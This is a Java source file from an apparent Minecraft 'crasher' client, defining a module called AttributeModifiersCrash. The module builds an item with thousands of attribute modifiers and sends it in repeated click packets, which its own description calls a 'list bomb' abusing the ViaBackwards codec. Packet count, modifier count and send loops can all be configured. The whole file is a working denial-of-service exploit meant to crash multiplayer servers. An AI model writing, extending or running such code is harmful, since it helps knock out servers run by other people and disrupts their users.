package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataAttributeModifiers;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class AttributeModifiersCrash extends Module {
	private ScheduledExecutorService executorService;

	public AttributeModifiersCrash() {
		super("AttributeModifiers", "Huge attribute_modifiers list bomb (ViaBackwards codec Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "100");
		addArgument("modifiers", ArgumentType.INT, 1, 100000, "4096");
		addArgument("map size", ArgumentType.INT, 1, 46, "16");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.FULL_ITEM_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
			return;
		}

		DataComponents components = new DataComponents();
		components.put(new DataAttributeModifiers(context.getInt("modifiers"), true));
		ItemStack stack = new ItemStack(ItemType.DIAMOND_SWORD.getId(protocol), 1, components);
		executorService = ClickCrashRunner.startItemClick(
				this, context, executorService, stack,
				context.getInt("map size"), context.getInt("packets"),
				context.getInt("threadSleep"), context.getInt("loopAmount")
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		ClickCrashRunner.shutdown(executorService);
	}
}
